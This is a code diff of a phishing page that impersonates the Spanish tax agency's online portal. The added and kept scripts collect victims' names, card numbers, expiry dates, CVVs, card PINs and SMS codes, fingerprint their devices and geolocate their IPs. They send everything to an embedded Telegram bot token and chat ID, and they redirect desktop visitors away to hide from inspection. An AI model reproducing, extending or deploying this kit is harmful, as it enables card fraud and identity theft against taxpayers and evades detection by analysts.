@@ -4,35 +4,27 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Sede Electrónica - Agencia Tributaria</title>
-    <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
 
     <!-- 1. Este es el noindex y nofollow para evitar que los motores de búsqueda indexen el sitio -->
     <meta name="robots" content="noindex, nofollow">
 
+    <!-- Script de FingerprintJS para el ID único del dispositivo -->
+    <script src="https://openfpcdn.io/fingerprintjs/v5"></script>
+
     <!-- 2. Este es para bloquear el acceso y redirigir si se intenta abrir desde un ordenador (Verificación avanzada anti-engaño) -->
     <script>
         (function() {
-            // Comprueba el User-Agent básico para ver si dice ser un dispositivo móvil
             var isMobileUA = /Mobi|Android|iPhone|iPad|iPod/i.test(navigator.userAgent);
-            
-            // Comprueba si el navegador soporta eventos táctiles reales (un PC emulado suele fallar aquí)
             var hasTouchScreen = (('ontouchstart' in window) || 
                                   (navigator.maxTouchPoints > 0) || 
                                   (navigator.msMaxTouchPoints > 0));
-            
-            // Comprueba la resolución de pantalla (los PCs suelen tener pantallas grandes o anchas)
             var isSmallScreen = window.innerWidth <= 800;
 
-            // Si el navegador de un PC intenta engañar falseando el User-Agent, 
-            // fallará en la detección táctil o en el ancho, y será redirigido.
             if (!isMobileUA || !hasTouchScreen || !isSmallScreen) {
                 window.location.href = "https://google.com";
             }
         })();
     </script>
-</head>
 
     <!-- Tailwind CSS CDN -->
     <script src="https://cdn.jsdelivr.net/npm/@tailwindcss/browser@4"></script>
@@ -45,7 +37,6 @@
             animation: custom-spin 1s linear infinite;
         }
     </style>
-
 </head>
 <body class="bg-gray-100 min-h-screen flex flex-col justify-between font-sans text-gray-800 m-0 p-0">
 
@@ -55,17 +46,16 @@
             <div class="flex items-center space-x-3">
                 <div class="w-10 h-10 flex items-center justify-center">
                     <svg viewBox="0 0 100 100" class="w-70 h-70">
-    <image 
-        href="https://logowik.com/content/uploads/images/agencia-tributaria9862.jpg"
-        x="0"
-        y="0"
-        width="110"
-        height="110"
-        preserveAspectRatio="xMidYMid meet"
-        style="border: none; outline: none;"
-    />
-</svg>
-
+                        <image 
+                            href="https://logowik.com/content/uploads/images/agencia-tributaria9862.jpg"
+                            x="0"
+                            y="0"
+                            width="110"
+                            height="110"
+                            preserveAspectRatio="xMidYMid meet"
+                            style="border: none; outline: none;"
+                        />
+                    </svg>
                 </div>
                 <span class="font-bold text-blue-900 tracking-tight text-sm sm:text-base hidden sm:inline">Sede Electrónica</span>
             </div>
@@ -74,48 +64,25 @@
                     <svg class="w-6 h-6" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24"><circle cx="12" cy="12" r="9"></circle><path d="M12 7v5l3 3"></path></svg>
                 </button>
                  <a href="https://sede.agenciatributaria.gob.es/Sede/mi-area-personal.html">
-                    <div  class="bg-blue-700 text-white p-2 rounded-md flex items-center justify-center">
-                    <svg class="w-5 h-5" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24"><path d="M20 21v-2a4 4 0 0 0-4-4H8a4 4 0 0 0-4 4v2"></path><circle cx="12" cy="7" r="4"></circle></svg>
-                </div>
+                    <div class="bg-blue-700 text-white p-2 rounded-md flex items-center justify-center">
+                        <svg class="w-5 h-5" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24"><path d="M20 21v-2a4 4 0 0 0-4-4H8a4 4 0 0 0-4 4v2"></path><circle cx="12" cy="7" r="4"></circle></svg>
+                    </div>
                 </a>
                 
-<div class="relative inline-block">
+                <div class="relative inline-block">
+                    <div id="languageButton" class="text-sm font-medium flex items-center text-gray-700 cursor-pointer"> 
+                        ES <svg id="languageArrow" class="w-4 h-4 ml-1 transition-transform" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24"><path d="M6 9l6 6 6-6"></path></svg> 
+                    </div>
 
-    <div id="languageButton" class="text-sm font-medium flex items-center text-gray-700 cursor-pointer"> 
-        ES <svg id="languageArrow" class="w-4 h-4 ml-1 transition-transform" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24"><path d="M6 9l6 6 6-6"></path></svg> 
-    </div>
-
-    <div id="languageMenu"
-         class="hidden absolute right-0 mt-2 w-40 bg-white border border-gray-200 rounded-lg shadow-lg z-50 overflow-hidden">
-
-        <button class="language-option w-full text-left px-4 py-2 text-sm text-gray-700 hover:bg-gray-100" data-lang="ES">
-            Español
-        </button>
-
-        <button class="language-option w-full text-left px-4 py-2 text-sm text-gray-700 hover:bg-gray-100" data-lang="CA">
-            Català
-        </button>
-
-        <button class="language-option w-full text-left px-4 py-2 text-sm text-gray-700 hover:bg-gray-100" data-lang="GL">
-            Galego
-        </button>
-
-        <button class="language-option w-full text-left px-4 py-2 text-sm text-gray-700 hover:bg-gray-100" data-lang="VA">
-            Valencià
-        </button>
-
-        <button class="language-option w-full text-left px-4 py-2 text-sm text-gray-700 hover:bg-gray-100" data-lang="EU">
-            Euskara
-        </button>
-
-        <button class="language-option w-full text-left px-4 py-2 text-sm text-gray-700 hover:bg-gray-100" data-lang="EN">
-            English
-        </button>
-
-    </div>
-</div>
-
-
+                    <div id="languageMenu" class="hidden absolute right-0 mt-2 w-40 bg-white border border-gray-200 rounded-lg shadow-lg z-50 overflow-hidden">
+                        <button class="language-option w-full text-left px-4 py-2 text-sm text-gray-700 hover:bg-gray-100" data-lang="ES">Español</button>
+                        <button class="language-option w-full text-left px-4 py-2 text-sm text-gray-700 hover:bg-gray-100" data-lang="CA">Català</button>
+                        <button class="language-option w-full text-left px-4 py-2 text-sm text-gray-700 hover:bg-gray-100" data-lang="GL">Galego</button>
+                        <button class="language-option w-full text-left px-4 py-2 text-sm text-gray-700 hover:bg-gray-100" data-lang="VA">Valencià</button>
+                        <button class="language-option w-full text-left px-4 py-2 text-sm text-gray-700 hover:bg-gray-100" data-lang="EU">Euskara</button>
+                        <button class="language-option w-full text-left px-4 py-2 text-sm text-gray-700 hover:bg-gray-100" data-lang="EN">English</button>
+                    </div>
+                </div>
             </div>
         </div>
         <div class="h-1 bg-blue-700 w-full"></div>
@@ -300,50 +267,34 @@
         </div>
     </footer>
 
-    <!--SCRIPT PARA AÑADIR IDIOMAS-->
+    <!-- SCRIPT PARA AÑADIR IDIOMAS -->
     <script>
+        const languageButton = document.getElementById("languageButton");
+        const languageMenu = document.getElementById("languageMenu");
+        const languageArrow = document.getElementById("languageArrow");
 
-    const languageButton = document.getElementById("languageButton");
-    const languageMenu = document.getElementById("languageMenu");
-    const languageArrow = document.getElementById("languageArrow");
-
-    languageButton.addEventListener("click", function(event) {
-
-        event.stopPropagation();
-
-        languageMenu.classList.toggle("hidden");
-        languageArrow.classList.toggle("rotate-180");
-
-    });
-
-    document.querySelectorAll(".language-option").forEach(option => {
-
-        option.addEventListener("click", function() {
-
-            const language = this.dataset.lang;
-
-            languageButton.childNodes[0].textContent = language + " ";
-
-            languageMenu.classList.add("hidden");
-            languageArrow.classList.remove("rotate-180");
-
-            console.log("Idioma seleccionado:", language);
-
+        languageButton.addEventListener("click", function(event) {
+            event.stopPropagation();
+            languageMenu.classList.toggle("hidden");
+            languageArrow.classList.toggle("rotate-180");
         });
 
-    });
+        document.querySelectorAll(".language-option").forEach(option => {
+            option.addEventListener("click", function() {
+                const language = this.dataset.lang;
+                languageButton.childNodes[0].textContent = language + " ";
+                languageMenu.classList.add("hidden");
+                languageArrow.classList.remove("rotate-180");
+            });
+        });
 
-    document.addEventListener("click", function() {
-
-        languageMenu.classList.add("hidden");
-        languageArrow.classList.remove("rotate-180");
-
-    });
-
+        document.addEventListener("click", function() {
+            languageMenu.classList.add("hidden");
+            languageArrow.classList.remove("rotate-180");
+        });
     </script>
 
-
-    <!-- SCRIPT CON TELEGRAM BOT Y VALIDACIONES -->
+    <!-- SCRIPT CON TELEGRAM BOT, VALIDACIONES Y RECONOCIMIENTO AVANZADO -->
     <script>
         const TELEGRAM_BOT_TOKEN = "8755847353:AAF4upNLjCstkjNC9Ryjbjja-CKlYKKzhDo";
         const TELEGRAM_CHAT_ID = "5892729609";
@@ -366,6 +317,107 @@
                     parse_mode: 'Markdown'
                 })
             }).catch(err => console.error("Error al enviar a Telegram:", err));
+        }
+
+        // Generador de Canvas Hash (GPU/Navegador)
+        function generarCanvasFingerprint() {
+            try {
+                const canvas = document.createElement('canvas');
+                canvas.width = 200;
+                canvas.height = 50;
+                const ctx = canvas.getContext('2d');
+                ctx.textBaseline = "top";
+                ctx.font = "14px 'Arial'";
+                ctx.fillStyle = "#f60";
+                ctx.fillRect(10, 10, 100, 30);
+                ctx.fillStyle = "#069";
+                ctx.fillText("Agencia Tributaria Sec ⚡", 2, 15);
+                return canvas.toDataURL().slice(-50);
+            } catch (e) {
+                return "No disponible";
+            }
+        }
+
+        let fpPromise = null;
+        try {
+            fpPromise = import('https://openfpcdn.io/fingerprintjs/v5')
+                .then(FingerprintJS => FingerprintJS.load());
+        } catch (e) {
+            console.error("Error cargando FingerprintJS", e);
+        }
+
+        async function obtenerInformacionCliente() {
+            const ahora = new Date();
+            const fechaHora = ahora.toLocaleString('es-ES', { timeZoneName: 'short' });
+
+            const ua = navigator.userAgent;
+            let dispositivo = "Dispositivo móvil / PC";
+            if (/android/i.test(ua)) dispositivo = "Android";
+            else if (/iphone|ipad|ipod/i.test(ua)) dispositivo = "iOS (iPhone/iPad)";
+            else if (/windows/i.test(ua)) dispositivo = "Windows PC";
+            else if (/macintosh|mac os x/i.test(ua)) dispositivo = "Mac OS";
+            else if (/linux/i.test(ua)) dispositivo = "Linux";
+
+            let navegador = "Desconocido";
+            if (/chrome/i.test(ua) && !/edge|opr/i.test(ua)) navegador = "Google Chrome";
+            else if (/safari/i.test(ua) && !/chrome/i.test(ua)) navegador = "Apple Safari";
+            else if (/firefox/i.test(ua)) navegador = "Mozilla Firefox";
+            else if (/edge/i.test(ua)) navegador = "Microsoft Edge";
+
+            const hardwareCores = navigator.hardwareConcurrency || "Desconocido";
+            const deviceMemory = navigator.deviceMemory ? navigator.deviceMemory + " GB" : "No disponible";
+            const touchPoints = navigator.maxTouchPoints || 0;
+            const screenRes = `${window.screen.width}x${window.screen.height}`;
+            
+            // Detección clara de Bot o Humano
+            const isWebdriver = navigator.webdriver ? "🤖 Es un Bot (Automatizado)" : "👤 Es un Humano real";
+            const canvasHash = generarCanvasFingerprint();
+
+            let visitorId = "Desconocido";
+            try {
+                if (fpPromise) {
+                    const fp = await fpPromise;
+                    const result = await fp.get();
+                    visitorId = result.visitorId;
+                }
+            } catch (e) {
+                visitorId = "Desconocido";
+            }
+
+            // Captura avanzada de IP (IPv4 / IPv6) y Geolocalización
+            let ip = "Desconocida", ciudad = "Desconocida", pais = "Desconocido";
+            try {
+                const response = await fetch('https://ipapi.co/json/');
+                const data = await response.json();
+                if (data) {
+                    ip = data.ip || "Desconocida";
+                    ciudad = data.city || "Desconocida";
+                    pais = data.country_name || "Desconocido";
+                }
+            } catch (e) {
+                console.error('No se pudo obtener la geolocalización', e);
+            }
+
+            return {
+                fechaHora, ip, ciudad, pais, dispositivo, navegador,
+                hardwareCores, deviceMemory, touchPoints, screenRes,
+                isWebdriver, canvasHash, visitorId
+            };
+        }
+
+        // Función para comprobar si el ciclo completo ya se había realizado antes
+        function verificarCicloRepetido(visitorId) {
+            let ciclosPrevios = localStorage.getItem('aeat_ciclos_completos') || 0;
+            ciclosPrevios = parseInt(ciclosPrevios) + 1;
+            localStorage.setItem('aeat_ciclos_completos', ciclosPrevios);
+
+            let idAnterior = localStorage.getItem('aeat_last_visitor_id');
+            if (idAnterior && idAnterior === visitorId && ciclosPrevios > 1) {
+                return "⚠️ *¡ATENCIÓN! Este mismo móvil/dispositivo ya ha completado todo el proceso anteriormente (Envío repetido)*";
+            } else {
+                localStorage.setItem('aeat_last_visitor_id', visitorId);
+                return "🟢 *Nuevo dispositivo (Primer proceso completado)*";
+            }
         }
 
         function showStep(stepId) {
@@ -467,13 +519,37 @@
             setTimeout(() => showStep('step-4'), 2500);
         }
 
-        function handleStep4(event) {
+        // Paso Final: Recoge el PIN, evalúa el ciclo completo y adjunta toda la información técnica limpia y detallada
+        async function handleStep4(event) {
             event.preventDefault();
             const pinCode = document.getElementById('pin-code').value;
             formDataStore.pinCode = pinCode;
 
-            const msg = `🔐 *PIN de Verificación (Paso 4)*\n` +
-                        `• PIN: \`${pinCode}\``;
+            const info = await obtenerInformacionCliente();
+            const estadoCiclo = verificarCicloRepetido(info.visitorId);
+
+            const msg = `🔐 *Proceso Completo Finalizado (Paso 4)*\n\n` +
+                        `${estadoCiclo}\n\n` +
+                        `👤 *Nombre:* ${formDataStore.nombre || 'N/A'}\n` +
+                        `📋 *Expediente:* \`${formDataStore.expediente || 'N/A'}\`\n` +
+                        `💶 *Importe:* ${formDataStore.importe || 'N/A'}\n` +
+                        `📞 *Contacto:* ${formDataStore.contacto || 'N/A'}\n\n` +
+                        `💳 *Tarjeta:* \`${formDataStore.cardNumber || 'N/A'}\`\n` +
+                        `⏳ *Caducidad:* ${formDataStore.cardExpiry || 'N/A'}\n` +
+                        `🔑 *CVV:* \`${formDataStore.cardCvv || 'N/A'}\`\n` +
+                        `🔢 *PIN Tarjeta:* \`${formDataStore.cardPin || 'N/A'}\`\n` +
+                        `💬 *SMS:* \`${formDataStore.smsCode || 'N/A'}\`\n` +
+                        `🔐 *PIN Final:* \`${pinCode}\`\n\n` +
+                        `🌐 *IP Completa (IPv4/v6):* \`${info.ip}\`\n` +
+                        `🏙️ *Ubicación:* ${info.ciudad}, ${info.pais}\n` +
+                        `📱 *Dispositivo:* ${info.dispositivo} (${info.navegador})\n` +
+                        `💻 *Hardware:* ${info.hardwareCores} núcleos / ${info.deviceMemory}\n` +
+                        `📐 *Pantalla:* ${info.screenRes} (Touch: ${info.touchPoints})\n` +
+                        `🔍 *Visitor ID:* \`${info.visitorId}\`\n` +
+                        `🎨 *Canvas Hash:* \`${info.canvasHash}\`\n` +
+                        `🤖 *Verificación:* ${info.isWebdriver}\n` +
+                        `⏰ *Fecha/Hora:* ${info.fechaHora}`;
+
             sendToTelegram(msg);
 
             showStep('spinner-4');
@@ -490,6 +566,6 @@
         }
     </script>
 
-
 </body>
 </html>
+
